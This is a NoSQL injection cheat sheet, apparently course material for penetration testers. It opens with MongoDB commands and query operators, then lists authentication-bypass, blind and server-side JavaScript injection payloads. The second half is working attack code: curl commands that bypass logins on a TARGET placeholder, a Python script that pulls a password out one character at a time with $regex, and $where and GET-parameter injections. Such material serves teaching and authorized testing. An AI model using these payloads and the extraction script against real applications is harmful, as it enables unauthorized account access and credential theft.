title: Introduction to NoSQL Injection
html:
Introduction to NoSQL Injection

MongoDB Usage

- Connect to MongoDB: mongosh mongodb://127.0.0.1:27017 - List databases: show databases - List collections: show collections - Insert data: db.collection.insertOne({...}) - Insert lots of data: db.apples.insertMany([{...},{...},...]) - Selecting data: db.collection.find({...}) - Selecting one piece of data: db.collection.findOne({...}) - Update (one) document: db.collection.updateOne({...}, {...}) - Update multiple documents: db.collection.updateMany({...}, {...}) - Delete document(s): db.apples.remove({...})

Query Operators

$eq

Matches values which are `equal to` a specified value

$gt

Matches values which are `greater than` a specified value

$gte

Matches values which are `greater than or equal to` a specified value

$in

Matches values which exist `in the specified array`

$lt

Matches values which are `less than` a specified value

$lte

Matches values which are `less than or equal to` a specified value

$nin

Matches values which are `not in the specified array`

$and

Matches documents which `meet the conditions of both` specified queries

$not

Matches documents which `do not meet the conditions` of a specified query

$nor

Matches documents which `do not meet the conditions` of any of the specified queries

$or

Matches documents which `meet the conditions of one` of the specified queries

$mod

Matches values which divided by a `specific divisor` have the `specified remainder`

$regex

Matches values which `match a specified RegEx`

$where

Matches documents which `satisfy a JavaScript expression`

Authentication Bypass / Data Exfiltration Payloads:

URL-Encoded

- param[$ne]=x - param[$gt]= - param[$gte]= - param[$lt]=~ - param[$lte]=~ - param[$regex]=.*

JSON

- {param: {$ne: 'x'}} - {param: {$gt: ''}} - {param: {$gte: ''}} - {param: {$lt: '~'}} - {param: {$lte: '~'}} - {param: {$regex: '.*'}} - {param: {$nin: []}}

Blind NoSQLi Payloads:

URL-Encoded

- param[$regex]=^XYZ.*$

JSON

- {param: {$regex: '^XYZ.*$}}

Server-Side JavaScript Injection Payloads:

- ' || true || ''==' - " || true || ""=="

This cheat sheet contains a (non-comprehensive) list of payloads you may use when testing an application for NoSQL injection vulnerabilities. The most important qualities for finding vulnerabilities are creativity and the ability to adapt, so it is possible that these payloads will not work in your specific scenario, but something else does. Some other resources you may want to refer to may be: - PayloadAllTheThings - NoSQL Injection - HackTricks - NoSQL Injection - NullSweep - NoSQL Injection Cheatsheet

NoSQL Injection Attack Scripts

Auth Bypass (URL-encoded form)

# $ne operator — username not equal to "x"
curl -X POST http://TARGET/login \
  -d 'username[$ne]=x&password[$ne]=x'

# $regex wildcard
curl -X POST http://TARGET/login \
  -d 'username=admin&password[$regex]=.*'

Auth Bypass (JSON body)

curl -X POST http://TARGET/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$ne":"invalid"}}'

Blind NoSQLi — Extract field value char-by-char

import requests, string

url = 'http://TARGET/login'
charset = string.ascii_letters + string.digits + '_@.'

def check(regex):
    r = requests.post(url,
        headers={'Content-Type': 'application/json'},
        json={'username': 'admin', 'password': {'$regex': f'^{regex}'}})
    return 'Welcome' in r.text  # adjust true condition

result = ''
for _ in range(32):
    for c in charset:
        if check(result + c):
            result += c
            print(f'[*] {result}', end='\r')
            break
    else:
        break
print(f'\n[+] Password: {result}')

Server-Side JavaScript Injection ($where)

# Time-based detection
curl -X POST http://TARGET/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$where":"sleep(3000)"}}'

# Boolean data exfil via $where
curl -X POST http://TARGET/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$where":"this.password.match(/^a/)"}}'

Operator Injection in GET parameter

# ?search[$regex]=.*
curl 'http://TARGET/api/users?search[$ne]=x'
curl 'http://TARGET/api/users?search[$gt]='
curl 'http://TARGET/api/users?search[$regex]=.*'
